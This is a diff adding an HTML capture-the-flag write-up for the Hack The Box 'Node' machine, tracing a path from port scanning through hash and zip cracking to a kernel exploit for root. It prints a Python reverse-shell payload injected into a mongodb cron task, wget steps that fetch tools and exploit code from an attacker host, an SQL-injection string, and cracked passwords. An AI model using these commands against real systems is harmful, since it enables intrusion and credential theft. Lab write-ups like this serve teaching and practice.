@@ -1,0 +1,205 @@
+I""<h1 id="introductionnode">Introduction@Node:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Node</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.58</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>30</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/343">g0blin</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>2th June 2017</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Detecting hidden directories <code class="language-plaintext highlighter-rouge">/api/users/</code> to find hash for the users.</li>
+  <li>Cracking hash and downloading a backup file.</li>
+  <li>Cracking password on the file to get the <code class="language-plaintext highlighter-rouge">SSH</code> password.</li>
+  <li>Escalating privilges to another user by loging in <code class="language-plaintext highlighter-rouge">mongodb</code>.</li>
+  <li>Exploited <code class="language-plaintext highlighter-rouge">Kernel Version</code> to gain Root.</li>
+</ul>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">Nmap</code> to scan the host.</p>
+
+<p><strong>Command</strong>: <em>nmap -p- -sV -T4 -Pn 10.10.10.58</em></p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/nmap-scan-1.png" alt="" /></p>
+
+<p>Accessing port 3000, we get a website:</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/port-3000-2.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">dirbuster</code> on <em>http://10.10.10.58:3000/</em> to find hidden directories.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/dirbuster-command-3.png" alt="" /></p>
+
+<p><strong>Wordlist Used</strong>: <em>directory-list-2.3-medium.txt</em></p>
+
+<p>I looked for <code class="language-plaintext highlighter-rouge">SQL injections</code> on the <em>login</em> page, but it didn’t work.</p>
+
+<p><strong>Command Used</strong>: <em>’ or 1=1 –+</em></p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/login-page-4.png" alt="" /></p>
+
+<p>From <code class="language-plaintext highlighter-rouge">dirbuster</code> I found few directories and accessed this <code class="language-plaintext highlighter-rouge">http://10.10.10.58:3000/api/users/</code></p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/got-new-user-12.png" alt="" /></p>
+
+<p>These are the hashes which are given with each user, so I used <a href="https://hashes.com/en/decrypt/hash">online hash cracking tool</a> to decode them.</p>
+
+<ul>
+  <li><strong>tom</strong>:<code class="language-plaintext highlighter-rouge">spongebob</code></li>
+  <li><strong>mark</strong>:<code class="language-plaintext highlighter-rouge">snowflake</code></li>
+  <li><strong>myP14ceAdm1nAcc0uNT</strong>:<code class="language-plaintext highlighter-rouge">manchester</code></li>
+</ul>
+
+<p>I tried loging in <code class="language-plaintext highlighter-rouge">SSH</code> first but didn’t work, accessing login page for <code class="language-plaintext highlighter-rouge">mark</code>,<code class="language-plaintext highlighter-rouge">tom</code>.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/loging-in-as-mark-11.png" alt="" /></p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/loging-in-as-tom-10.png" alt="" /></p>
+
+<p>Both of them are not <code class="language-plaintext highlighter-rouge">Admins</code>, Let’s look into <em>myP14ceAdm1nAcc0uNT</em>.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/loging-in-as-myplaceadminaccount-14.png" alt="" /></p>
+
+<p>Downloading <code class="language-plaintext highlighter-rouge">myplace.backup</code> file and opening it in <em>Geany Tool</em> for Kali Linux.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/myplace.backup-file-15.png" alt="" /></p>
+
+<p>It looks like that the file is <code class="language-plaintext highlighter-rouge">base64</code> encoded, let’s decode it first and then access it.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Command Used</strong>:*cat myplace.backup</td>
+      <td>base64 -d &gt; backup.zip*</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="language-plaintext highlighter-rouge">backup.zip</code> requires a password.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/decoded-backup-file-requires-password-16.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">fcrackzip</code> to crack the password.</p>
+
+<p><strong>Command Used</strong>: <em>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt  backup.zip</em> (sudo apt-get install fcrackzip).</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/fcrackzip-password-found-17.png" alt="" /></p>
+
+<p>We got the password as <code class="language-plaintext highlighter-rouge">magicword</code>.</p>
+
+<p>Now while accessing the <code class="language-plaintext highlighter-rouge">var</code> directory, I found a password for mark in <code class="language-plaintext highlighter-rouge">/var/www/myplace/app.js</code> as <code class="language-plaintext highlighter-rouge">5AYRft73VtFpc84k</code>.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/got-mark-password-18.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">SSH</code> as mark.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/ssh-loggedin-as-mark-19.png" alt="" /></p>
+
+<p>We don’t have the permission to read the user flag, I used <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas.sh</a> and <a href="https://github.com/DominicBreuker/pspy/blob/master/README.md">pspy32</a></p>
+
+<p><strong>Hosting Command</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p><strong>Downlaoding Command</strong>: <em>wget http://10.10.X.X:8081/linpeas.sh</em>    (or <em>pspy32s</em>)</p>
+
+<p>I executed <code class="language-plaintext highlighter-rouge">linpeas.sh</code> by giving it executing permission (<em>chmod +x linpeas.sh</em>)</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/mongodb-running-locally-25.png" alt="" /></p>
+
+<p>Here port <code class="language-plaintext highlighter-rouge">27017</code> is for <em>mongodb</em> which is running locally as <em>Tom</em>.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/only-reading-permissions-24.png" alt="" /></p>
+
+<p>Loging into <code class="language-plaintext highlighter-rouge">mongodb</code>.</p>
+
+<p><strong>Command Used</strong>: <em>mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler</em></p>
+
+<p>where <em>scheduler</em>: Database name.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/loging-in-mongodb-26.png" alt="" /></p>
+
+<p>As shown above there is not any task running in <code class="language-plaintext highlighter-rouge">scheduler</code>, but it’s a cronjob <em>(saw that in pspy32)</em> as Tom. Let’s add our <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a> and listen on the specifed port using <code class="language-plaintext highlighter-rouge">nc</code>.</p>
+
+<p><strong>Payload</strong>: <em>db.tasks.insert({cmd: “python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.X.X",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’”})</em></p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/getting-reverse-shell-as-tom-27.png" alt="" /></p>
+
+<p>We got <code class="language-plaintext highlighter-rouge">User flag</code>.</p>
+
+<p>For privilege escalation I looked for a kenerl exploit as it is outdated, found <a href="https://www.exploit-db.com/exploits/45010">this</a></p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/kernel-exploit-29.png" alt="" /></p>
+
+<p>Transfered it to victim machine.</p>
+
+<p><strong>Hosting Command</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p><strong>Downlaoding Command</strong>: <em>wget http://10.10.X.X:8081/exploit.c</em></p>
+
+<p>Compiling it on the victim machine.</p>
+
+<p><strong>Command</strong>: <em>gcc exploit.c -o privesc</em></p>
+
+<p>I executed <code class="language-plaintext highlighter-rouge">privesc</code> by giving it executing permission (<em>chmod +x privesc</em>).</p>
+
+<p>Stabling the <a href="https://netsec.ws/?p=337">shell</a>.</p>
+
+<hr />
+<p><img src="/assets/img/node-hackthebox/got-root-flag-32.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">Root</code>.</p>
+
+:ET
